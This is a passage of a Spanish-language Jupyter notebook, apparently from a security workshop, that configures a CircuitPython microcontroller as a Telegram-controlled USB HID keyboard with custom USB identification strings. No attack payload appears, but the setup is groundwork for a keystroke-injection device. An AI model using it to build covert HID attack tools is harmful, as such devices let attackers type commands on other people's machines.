      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None"
     ]
    }
   ],
   "source": [
    "# bucle infinito para que el bot telegram se procese indefinidamente (lo limito a 90seg)\n",
    "import time\n",
    "tiempo_inicial = time.time()\n",
    "\n",
    "# Bucle que se ejecuta durante 90 segundos\n",
    "while True and (time.time() - tiempo_inicial) < 190:\n",
    "    procesa_telegram()\n",
    "    time.sleep(5)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf63b65f-9b89-45fd-b2d7-2c55980f1bd2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Si no esta conectado el wifi reinicia en modo seguro Asi puedo reprogamar\n",
    "import microcontroller,wifi\n",
    "if not wifi.radio.connected:\n",
    "    microcontroller.on_next_reset(microcontroller.RunMode.SAFE_MODE)\n",
    "    microcontroller.reset()\n",
    "#esto es para poder programarlo si quito el terminal serie en boot.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1812c810-d1a6-4e0f-8967-b2389dfd1278",
   "metadata": {},
   "outputs": [],
   "source": [
    "# reinicia la maq si es necesario \n",
    "# en este caso hace falta mas a menudo (el s2 va muy justo)\n",
    "# Ya que con las pruebas se agota el numero de pools disponibles\n",
    "#%serialconnect --verbose --port=/dev/ttyACM2\n",
    "#import microcontroller; microcontroller.on_next_reset(microcontroller.RunMode.SAFE_MODE)\n",
    "#import microcontroller; microcontroller.reset()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ea3393b8-618b-4dc1-9b77-8450a8834df4",
   "metadata": {},
   "source": [
    "<br><br><br><hr>\n",
    "## A1) Configuracion de __Librerias__\n",
    "- https://circuitpython.org/libraries\n",
    "- https://github.com/adafruit/Adafruit_CircuitPython_Bundle/releases/\n",
    "\n",
    "1) Descargamos el paquete de librerias correspondiente e nuestra versio 8 o 9\n",
    "2) Montamos la unidad DIETY\n",
    "3) Copiamos en la carpeta lib: el archivo \"adafruit_requests.mpy\" y la carpeta \"adafruit_hid\"\n",
    "4) Desmontamos y reiniciamos placa"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "481f10d4-1c42-4549-ad63-53bd7ed0c77f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['.fseventsd', '.metadata_never_index', '.Trashes', '.Trash-1000', 'sd', 'settings.toml', 'code.py', 'lib', 'boot_out.txt', 'boot.py']\n",
      "['adafruit_hid', 'adafruit_requests.mpy', 'adafruit_connection_manager.mpy']\n"
     ]
    }
   ],
   "source": [
    "# Comprobacion: Listado de archivos/Librerias\n",
    "import os ; print(os.listdir(\"\")) ; print(os.listdir(\"lib\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f7118cea-a799-4b78-91c0-0e8256a0bd42",
   "metadata": {},
   "source": [
    "<br><br><br><hr>\n",
    "## Configuracion de __settings.toml__"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "610b9f5c-2351-4cf3-9dfb-0d297a240d68",
   "metadata": {},
   "source": [
    "```toml\n",
    "## contenido settings.toml (archivo de configuracion)\n",
    "SSID   = \"el_ssid_de_tu_wifi\"\n",
    "WPWD   = \"el_password_de_tu_wifi\"\n",
    "bot_tk = \"bot+ el token del bot de telegram (busca/investiga: telegram botfather)\"\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a19f200c-b1b4-4d29-b009-21a4599cdc83",
   "metadata": {},
   "source": [
    "```python\n",
    "## Generar settings.toml (si no se puede desde el sistema de archivos)\n",
    "## OPCION1: Minimo consumo de recursos\n",
    "import storage\n",
    "with open('settings.toml', 'w') as file:\n",
    "    file.write('SSID = \"XXXX\"\\n')\n",
    "    file.write('WPWD = \"YYYY\"\\n')\n",
    "    file.write('bot_tk = \"botZZZZ:ZZZZ\"\\n')\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e674ceec-327e-4c7e-b452-114d8e765625",
   "metadata": {},
   "source": [
    "```python\n",
    "## Generar settings.toml (si no se puede desde el sistema de archivos)\n",
    "## OPCION2: Modo CircuitPython Se habilitara: CircuitPython's Web API (consume mas recursos)\n",
    "import storage\n",
    "with open('settings.toml', 'w') as file:\n",
    "    file.write('CIRCUITPY_WIFI_SSID = \"XXXX\"\\n')\n",
    "    file.write('CIRCUITPY_WIFI_PASSWORD = \"YYYY\"\\n')\n",
    "    file.write('CIRCUITPY_WEB_API_PASSWORD = \"\"\\n') #En teoria Cadena vacia desabilita\n",
    "    file.write('CIRCUITPY_WEB_API_PORT = \"80\"\\n')\n",
    "    file.write('bot_tk = \"botZZZZ:ZZZZ\"\\n')\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "2ceb7818-c572-4a7e-bde4-bebd0ad1f054",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SSID = \"TestWiFi\"\n",
      "WPWD = \"password\"\n",
      "bot_tk = \"botXXXXXXXXX0\"\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Comprueba fichero\n",
    "#\n",
    "print(open('settings.toml', 'r').read())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4fc16b01-79d7-42ef-a9c6-cc3cac101ca7",
   "metadata": {},
   "source": [
    "<br><br><br><hr>\n",
    "## Configuracion de __boot.py__"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7905635d-f906-4f75-aee0-9493fe9371e1",
   "metadata": {},
   "source": [
    "```toml\n",
    "## Contenido boot.py (archivo de configuracion se ejecuta nada mas arrancar la maq)\n",
    "## Aqui se definen los parametros USB (se ejecuta antes del usb)\n",
    "\n",
    "import usb_cdc, usb_hid, storage, supervisor\n",
    "\n",
    "storage.disable_usb_drive() #desabilito storaje para liberar endpoints\n",
    "\n",
    "#Configuro parametros USB:         Fabricante    , Producto          , VID  , PID\n",
    "supervisor.set_usb_identification(\"Sh3llC0N_2024\",\"Understanding_USB\",0x2E8A,0x0005)\n",
    "\n",
    "#Ojo si habilitas un segundo CDC te comes todos los endpoints\n",
    "#usb_cdc.enable(console=True, data=True)    # Enable console and data\n",
    "\n",
    "#usb_hid.enable((usb_hid.Device.KEYBOARD,usb_hid.Device.MOUSE,USB_hid.Device.CONSUMER_CONTROL))\n",
    "#usb_hid.enable((usb_hid.Device.KEYBOARD,usb_hid.Device.MOUSE))\n",
    "usb_hid.enable((usb_hid.Device.KEYBOARD,))\n",
    "\n",
    "print(\"fin boot.py\")\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "960db498-eda6-4dcb-abfc-a1c478108adb",
   "metadata": {},
   "source": [
    "```python\n",
    "## Generar boot.py (si no se puede desde el sistema de archivos)\n",
    "# https://learn.adafruit.com/customizing-usb-devices-in-circuitpython/usb-setup-timing\n",
    "# https://docs.circuitpython.org/en/latest/shared-bindings/supervisor/index.html#supervisor.set_usb_identification\n",
    "# https://github.com/obdev/v-usb/blob/master/usbdrv/USB-IDs-for-free.txt\n",
    "\n",
    "import storage\n",
    "with open('boot.py', 'w') as file:\n",
    "    file.write('import usb_cdc, usb_hid, storage, supervisor\\n')\n",
    "    file.write('\\n')\n",
    "    file.write('storage.disable_usb_drive() #desabilito storaje para liberar endpoints\\n')\n",
    "    file.write('\\n')\n",
    "    file.write('#Configuro parametros USB: Fabricante , Producto , VID  , PID\\n')    \n",
    "    file.write('supervisor.set_usb_identification(\"Sh3llC0N_2024\",\"Understanding_USB\",0x16c0,0x05e1)\\n')\n",
    "    file.write('\\n')\n",
    "    file.write('#Ojo si habilitas un segundo CDC te comes todos los endpoints\\n')\n",
    "    file.write('#usb_cdc.enable(console=True, data=True)    # Enable console and data\\n')\n",
    "    file.write('\\n')\n",
    "    file.write('#usb_hid.enable((usb_hid.Device.KEYBOARD,usb_hid.Device.MOUSE,USB_hid.Device.CONSUMER_CONTROL))\\n')\n",
    "    file.write('#usb_hid.enable((usb_hid.Device.KEYBOARD,usb_hid.Device.MOUSE))\\n')\n",
    "    file.write('usb_hid.enable((usb_hid.Device.KEYBOARD,))\\n')\n",
    "    file.write('\\n')\n",
    "    file.write('\\n')\n",
    "    file.write('print(\"fin boot.py\")\\n')\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "d4bb64e1-3efd-4683-968b-66f14d0860ac",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "import usb_cdc, usb_hid, storage, supervisor\n",
      "\n",
      "storage.disable_usb_drive() #desabilito storaje para liberar endpoints\n",
      "\n",
      "supervisor.set_usb_identification(\"Stucom_2024\",\"Hacking_USB\",0x2E8A,0x0005)\n",
      "\n",
      "#Ojo si habilitas un segundo CDC te comes todos los endpoints\n",
      "#usb_cdc.enable(console=True, data=True)    # Enable console and data\n",
      "\n",
      "#usb_hid.enable((usb_hid.Device.KEYBOARD,usb_hid.Device.MOUSE,USB_hid.Device.CONSUMER_CONTROL))\n",
      "usb_hid.enable((usb_hid.Device.KEYBOARD,usb_hid.Device.MOUSE))\n",
      "#usb_hid.enable((usb_hid.Device.KEYBOARD,))\n",
      "\n",
      "print(\"fin boot.py\")\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Comprueba fichero\n",
    "#\n",
    "print(open('boot.py', 'r').read())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "264a2577-fe42-4ac0-9f65-14110f0bb4d9",
   "metadata": {},
   "source": [
    "Los datos de la deteccion del dispositivo se verian asi:\n",
    "```sh\n",
    "# dmesg |tail -10\n",
    "[513713.964894] usb 1-1.4.1: USB disconnect, device number 33\n",
    "[513716.798624] usb 1-1.4.1: new full-speed USB device number 34 using ehci-platform\n",
    "[513717.125038] usb 1-1.4.1: New USB device found, idVendor=16c0, idProduct=05e1, bcdDevice= 1.00\n",
    "[513717.125113] usb 1-1.4.1: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n",
    "[513717.125129] usb 1-1.4.1: Product: Understanding_USB\n",
    "[513717.125143] usb 1-1.4.1: Manufacturer: Sh3llC0N_2024\n",
    "[513717.125157] usb 1-1.4.1: SerialNumber: 48CF6E1D726E\n",
    "[513717.176012] cdc_acm 1-1.4.1:1.0: ttyACM2: USB ACM device\n",
    "[513717.331292] input: Sh3llC0N_2024 Understanding_USB as /devices/platform/soc/1c1a000.usb/usb1/1-1/1-1.4/1-1.4.1/1-1.4.1:1.2/0003:16C0:05E1.0023/input/input61\n",
    "[513717.395835] xinmo 0003:16C0:05E1.0023: input,hidraw0: USB HID v1.11 Keyboard [Sh3llC0N_2024 Understanding_USB] on usb-1c1a000.usb-1.4.1/input2\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e5deaf2a-94d4-409e-9e99-bc2712e69d05",
   "metadata": {},
   "outputs": [],
   "source": [
    "#reinicia la maq si es necesario\n",
    "#import microcontroller; microcontroller.reset()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "CircuitPython",
   "language": "python",
   "name": "circuitpython"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "python",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "pygments_lexer": "python3",
   "version": "3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
